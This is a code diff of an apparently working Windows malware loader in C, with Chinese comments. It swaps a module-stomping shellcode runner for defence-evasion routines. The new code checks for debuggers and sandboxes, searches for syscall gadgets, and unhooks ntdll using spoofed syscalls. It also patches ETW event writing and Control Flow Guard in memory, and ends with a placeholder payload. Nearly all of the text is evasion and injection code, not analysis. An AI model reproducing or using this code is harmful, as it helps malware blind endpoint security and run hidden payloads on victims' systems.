@@ -1,137 +1,245 @@
 #include "myloader.h"
 
-BOOL ModuleStompPayload(PVX_TABLE pVxTable) {
+#define HASH_EtwEventWriteFull 0x1069bb5eab142403
+
+static BOOL GetTextSectionRange(PVOID moduleBase, PVOID* outBase, SIZE_T* outSize) {
+    if (!moduleBase || !outBase || !outSize) return FALSE;
+
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase;
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
+
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDos->e_lfanew);
+    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
+
+    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
+    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        if ((*(ULONG*)pSection[i].Name | 0x20202020) == 'xet.') {
+            *outBase = (PBYTE)moduleBase + pSection[i].VirtualAddress;
+            *outSize = pSection[i].Misc.VirtualSize;
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+BOOL CheckEnvironment() {
+    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
+    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
+    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA) {
+        return FALSE;
+    }
+    if (pCurrentPeb->BeingDebugged == 1) return FALSE;
+    if ((pCurrentPeb->NtGlobalFlag & 0x70) == 0x70) return FALSE;
+    if (pCurrentPeb->NumberOfProcessors < 2) return FALSE;
+    PVOID pHeap = pCurrentPeb->ProcessHeap;
+    if (pHeap) {
+        DWORD heapFlags = *(DWORD*)((PBYTE)pHeap + 0x70);
+        DWORD heapForceFlags = *(DWORD*)((PBYTE)pHeap + 0x74);
+        if (!(heapFlags & 0x2) || heapForceFlags != 0) {
+            return FALSE;
+        }
+    }
+    BYTE kdDebuggerEnabled = *(BYTE*)(0x7FFE02D4);
+    if (kdDebuggerEnabled & 0x1 || kdDebuggerEnabled & 0x2) {
+        return FALSE;
+    }
+
+    unsigned __int64 t1, t2;
+    t1 = __rdtsc();
+    GetTickCount(); 
+    t2 = __rdtsc();
+    if ((t2 - t1) > 100000) { 
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+#ifndef PAGE_SIZE
+#define PAGE_SIZE 0x1000
+#endif
+#define PAGE_ALIGN_DOWN(x) ((ULONG_PTR)(x) & ~(PAGE_SIZE - 1))
+
+PVOID FindSyscallGadgetInRange(PVOID pStart, PVOID pEnd) {
+    PBYTE pCur = (PBYTE)pStart;
+    while ((ULONG_PTR)pCur < (ULONG_PTR)pEnd - 3) {
+        // 0F 05 C3 : syscall; ret
+        if (pCur[0] == 0x0F && pCur[1] == 0x05 && pCur[2] == 0xC3) {
+            return (PVOID)pCur;
+        }
+        pCur++;
+    }
+    return NULL;
+}
+
+BOOL UnhookNtdll(PVX_TABLE pVxTable) {
     NTSTATUS status = 0;
-    HANDLE hFile = NULL;
     HANDLE hSection = NULL;
-    PVOID pStompAddress = NULL;
-    SIZE_T sViewSize = 0;
-    // 1. 构造目标 DLL 的完整 NT 路径
-    WCHAR szNtPath[] = { 
-        L'\\', L'?', L'?', L'\\', 
-        L'C', L':', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', 
-        L'S', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', 
-        L'x', L'p', L's', L's', L'e', L'r', L'v', L'i', L'c', L'e', L's', L'.', L'd', L'l', L'l', 
-        0 
+    PVOID pCleanNtdll = NULL;
+    SIZE_T viewSize = 0;
+    WCHAR szKnownDllPath[] = { 
+        L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\', 
+        L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', 0 
     };
-    UNICODE_STRING usNtPath;
-    VxInitUnicodeString(&usNtPath, szNtPath);
+    UNICODE_STRING usKnownDllPath;
+    VxInitUnicodeString(&usKnownDllPath, szKnownDllPath);
 
     OBJECT_ATTRIBUTES objAttr = { 0 };
-    InitializeObjectAttributes(&objAttr, &usNtPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    InitializeObjectAttributes(&objAttr, &usKnownDllPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-    IO_STATUS_BLOCK ioStatus = { 0 };
-
-    // =========================================================================
-    // NtOpenFile - 打开 DLL 文件
-    // ========================================================================= 
-    status = InvokeSpoofedSyscall(&pVxTable->NtOpenFile, 6,
-        &hFile,
-        FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE, // 权限
-        &objAttr,
-        &ioStatus,
-        FILE_SHARE_READ,
-        FILE_SYNCHRONOUS_IO_NONALERT // 选项
-    );
-    if (!NT_SUCCESS(status)) {
-        //ERR("[-] NtOpenFile Failed: 0x%X", status);
-        return FALSE;
-    }
-    // =========================================================================
-    // NtCreateSection - 创建镜像节
-    // ========================================================================= 
-    // SEC_IMAGE (0x1000000)告诉内核按照 PE 结构解析文件
-    status = InvokeSpoofedSyscall(&pVxTable->NtCreateSection, 7,
-        &hSection,
-        SECTION_ALL_ACCESS,
-        NULL,
-        (PVOID)0,
-        PAGE_EXECUTE_READ,
-        SEC_IMAGE, 
-        hFile
-    );
-    if (!NT_SUCCESS(status)) {
-        InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hFile);
-        //ERR("[-] NtCreateSection Failed: 0x%X", status);
-        return FALSE;
-    }
-    InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hFile);
-    // =========================================================================
-    // NtMapViewOfSection - 映射到内存
-    // ========================================================================= 
-    pStompAddress = NULL; 
-    sViewSize = 0;  
+    status = InvokeSpoofedSyscall(&pVxTable->NtOpenSection, 3, &hSection, SECTION_MAP_READ, &objAttr);
+    if (!NT_SUCCESS(status)) return FALSE;
     status = InvokeSpoofedSyscall(&pVxTable->NtMapViewOfSection, 10,
-        hSection,
-        (HANDLE)-1, // 当前进程
-        &pStompAddress,
-        (PVOID)0,
-        (PVOID)0,
-        NULL,
-        &sViewSize,
-        2, // ViewShare (继承方式)
-        0,
-        PAGE_EXECUTE_READ
-    );
-    //关闭Section 句柄
-    InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hSection);
-    if (!NT_SUCCESS(status)) {
-        //ERR("[-] NtMapViewOfSection Failed: 0x%X", status);
-        return FALSE;
-    }
-    // LOG("[+] DLL Mapped at: %p (Size: 0x%llX)", pStompAddress, sViewSize);
-    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pStompAddress;
-    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pStompAddress + pDos->e_lfanew);
-    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
+        hSection, (HANDLE)-1, &pCleanNtdll, 0, 0, NULL, &viewSize, 2, 0, PAGE_READONLY);
     
-    PVOID pCodeSection = NULL;
-    SIZE_T sCodeSize = 0;
-
-    // 遍历查找 .text
+    InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hSection); 
+    if (!NT_SUCCESS(status)) return FALSE;
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pCleanNtdll;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pCleanNtdll + pDos->e_lfanew);
+    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
+    if (!g_ntdllBase) return FALSE;
     for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-        if (pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
-            pCodeSection = (PBYTE)pStompAddress + pSection[i].VirtualAddress;
-            sCodeSize = pSection[i].Misc.VirtualSize;
+        if ((*(ULONG*)pSection[i].Name | 0x20202020) == 'xet.') {
+            ULONG_PTR dirtyStart = (ULONG_PTR)g_ntdllBase + pSection[i].VirtualAddress;
+            ULONG_PTR cleanStart = (ULONG_PTR)pCleanNtdll + pSection[i].VirtualAddress;
+            SIZE_T size = pSection[i].Misc.VirtualSize;
+            ULONG_PTR splitPoint = PAGE_ALIGN_DOWN(dirtyStart + size / 2);
+            PVOID pRegion1Base = (PVOID)dirtyStart;
+            SIZE_T sRegion1Size = splitPoint - dirtyStart;
+            PVOID pClean1Base = (PVOID)cleanStart;
+            PVOID pRegion2Base = (PVOID)splitPoint;
+            SIZE_T sRegion2Size = (dirtyStart + size) - splitPoint;
+            PVOID pClean2Base = (PVOID)(cleanStart + sRegion1Size);
+            PVOID pGadgetInRegion2 = FindSyscallGadgetInRange(pRegion2Base, (PVOID)((ULONG_PTR)pRegion2Base + sRegion2Size));
+            PVOID pGadgetInRegion1 = FindSyscallGadgetInRange(pRegion1Base, (PVOID)((ULONG_PTR)pRegion1Base + sRegion1Size));
+
+            if (!pGadgetInRegion1 || !pGadgetInRegion2) {
+                ERR("[-]Unable to find syscallGadget");
+                break;
+            }
+
+            ULONG ulOldProtect = 0;
+            pVxTable->NtProtectVirtualMemory.pSyscallInst = pGadgetInRegion2;
+            status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
+                (HANDLE)-1, &pRegion1Base, &sRegion1Size, PAGE_READWRITE, &ulOldProtect);
+            
+            if (NT_SUCCESS(status)) {
+                VxMoveMemory(pRegion1Base, pClean1Base, sRegion1Size);
+                InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
+                    (HANDLE)-1, &pRegion1Base, &sRegion1Size, ulOldProtect, &ulOldProtect);
+            }
+            pVxTable->NtProtectVirtualMemory.pSyscallInst = pGadgetInRegion1;
+            status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
+                (HANDLE)-1, &pRegion2Base, &sRegion2Size, PAGE_READWRITE, &ulOldProtect);
+            if (NT_SUCCESS(status)) {
+                VxMoveMemory(pRegion2Base, pClean2Base, sRegion2Size);
+                InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
+                    (HANDLE)-1, &pRegion2Base, &sRegion2Size, ulOldProtect, &ulOldProtect);
+            }
             break;
         }
     }
-    if (!pCodeSection) {
-        // ERR("[-] Code section not found");
-        return FALSE;
-    }
-    // 4. 定义 Shellcode 
-	unsigned char shellcode[] ="\x90";
-        
-    if (sizeof(shellcode) > sCodeSize){ 
-        return FALSE;
-    }
-    // 5. 修改权限 RW 
-    // 这里 pBaseAddress 必须指向我们要写入的地方 (pCodeSection)
-    PVOID pProtectAddress = pCodeSection;
-    SIZE_T sProtectSize = sizeof(shellcode);
-    ULONG ulOldProtect = 0;
-    status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
-        (HANDLE)-1, &pProtectAddress, &sProtectSize, PAGE_READWRITE, &ulOldProtect);
+    InvokeSpoofedSyscall(&pVxTable->NtUnmapViewOfSection, 2, (HANDLE)-1, pCleanNtdll);
+    return TRUE;
+}
+BOOL IsNtdllTainted(PVX_TABLE pVxTable) {
+    if (!g_ntdllBase) return TRUE; 
+    PVOID pTextBase = NULL;
+    SIZE_T sTextSize = 0;
+    if (!GetTextSectionRange(g_ntdllBase, &pTextBase, &sTextSize)) return TRUE;
 
-    if (!NT_SUCCESS(status)) return FALSE;
-    // 6. 写入 Payload
-    VxMoveMemory(pCodeSection, shellcode, sizeof(shellcode));
-    // 7. 恢复权限 RX
-    status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
-        (HANDLE)-1, &pProtectAddress, &sProtectSize, PAGE_EXECUTE_READ, &ulOldProtect);
+    PBYTE pCurrent = (PBYTE)pTextBase;
+    PBYTE pEnd = pCurrent + sTextSize;
     
+    NTSTATUS status;
+    MEMORY_WORKING_SET_EX_INFORMATION memExInfo;
+
+    while (pCurrent < pEnd) {
+        memExInfo.VirtualAddress = pCurrent;
+        memExInfo.VirtualAttributes.Flags = 0;
+        status = InvokeSpoofedSyscall(&pVxTable->NtQueryVirtualMemory, 6,
+            (HANDLE)-1,
+            pCurrent,
+            MemoryWorkingSetExInformation,
+            &memExInfo,
+            sizeof(memExInfo),
+            NULL
+        );
+        if (NT_SUCCESS(status)) {
+            if (memExInfo.VirtualAttributes.Valid && !memExInfo.VirtualAttributes.Shared) {
+                LOG("Found Dirty Page at: %p", pCurrent);
+                return TRUE;
+            }
+        }
+        pCurrent += 0x1000;
+    }
+    return FALSE;
+}
+
+BOOL PatchEtw(PVX_TABLE pVxTable) {
+    if (!g_ntdllBase) return FALSE;
+    PVOID pEtwEventWriteFull = GetProcAddressByName(g_ntdllBase, HASH_EtwEventWriteFull);
+    if (!pEtwEventWriteFull) return FALSE;
+    // 2. 搜索 call 指令 (Opcode: 0xE8)
+    PBYTE pSearch = (PBYTE)pEtwEventWriteFull;
+    PVOID pTargetFunc = NULL;
+    for (int i = 0; i < 64; i++) {
+        if (pSearch[i] == 0xE8) {
+            LONG offset = *(PLONG)(pSearch + i + 1);
+            pTargetFunc = (PVOID)(pSearch + i + 5 + offset);
+            break;
+        }
+    }
+    if (!pTargetFunc) return FALSE;
+    BYTE patchBytes[] = { 0x33, 0xC0, 0xC3 }; 
+    
+    PVOID pBaseAddress = pTargetFunc;
+    SIZE_T sSize = sizeof(patchBytes);
+    ULONG ulOldProtect = 0;
+    NTSTATUS status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
+        (HANDLE)-1, &pBaseAddress, &sSize, PAGE_READWRITE, &ulOldProtect);
     if (!NT_SUCCESS(status)) return FALSE;
 
-    // 8. 创建线程
-    HANDLE hThread = NULL;
-    status = InvokeSpoofedSyscall(&pVxTable->NtCreateThreadEx, 11,
-        &hThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)pCodeSection,
-        NULL, FALSE, NULL, NULL, NULL, NULL);
-    if (NT_SUCCESS(status)) {
-         LARGE_INTEGER Timeout;
-         Timeout.QuadPart = -10000000;
-         InvokeSpoofedSyscall(&pVxTable->NtWaitForSingleObject, 3, hThread, FALSE, &Timeout);
-    }
+    VxMoveMemory(pTargetFunc, patchBytes, sizeof(patchBytes));
+    InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
+        (HANDLE)-1, &pBaseAddress, &sSize, ulOldProtect, &ulOldProtect);
+    return TRUE;
+}
 
-    return NT_SUCCESS(status);
+BOOL PatchCFG(PVX_TABLE pVxTable) {
+    if (!g_ntdllBase) return FALSE;
+    PVOID pTextBase = NULL;
+    SIZE_T sTextSize = 0;
+    if (!GetTextSectionRange(g_ntdllBase, &pTextBase, &sTextSize)) return FALSE;
+
+    // 2. 特征码扫描
+    // 特征: push rax (0x50); sub rsp, 80h (0x48 0x83 0xEC 0x80)
+    BYTE signature[] = { 0x50, 0x48, 0x83, 0xEC, 0x80 };
+    PBYTE pScan = (PBYTE)pTextBase;
+    PVOID pTargetFunc = NULL;
+    if (sTextSize < sizeof(signature)) return FALSE;
+    for (SIZE_T i = 0; i + sizeof(signature) <= sTextSize; i++) {
+        if (memcmp(pScan + i, signature, sizeof(signature)) == 0) {
+            pTargetFunc = pScan + i;
+            break; 
+        }
+    }
+    if (!pTargetFunc) return FALSE;
+    BYTE patchBytes[] = { 0xFF, 0xE0 }; 
+
+    PVOID pBaseAddress = pTargetFunc;
+    SIZE_T sSize = sizeof(patchBytes);
+    ULONG ulOldProtect = 0;
+    NTSTATUS status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
+        (HANDLE)-1, &pBaseAddress, &sSize, PAGE_READWRITE, &ulOldProtect);
+
+    if (!NT_SUCCESS(status)) return FALSE;
+    VxMoveMemory(pTargetFunc, patchBytes, sizeof(patchBytes));
+    InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
+        (HANDLE)-1, &pBaseAddress, &sSize, ulOldProtect, &ulOldProtect);
+    return TRUE;
+}
+
+BOOL Payload() {
+    InvokeSpoofedApi(djb2((PBYTE)"Sleep"), 1, -600000000LL);
+    return TRUE;
 }
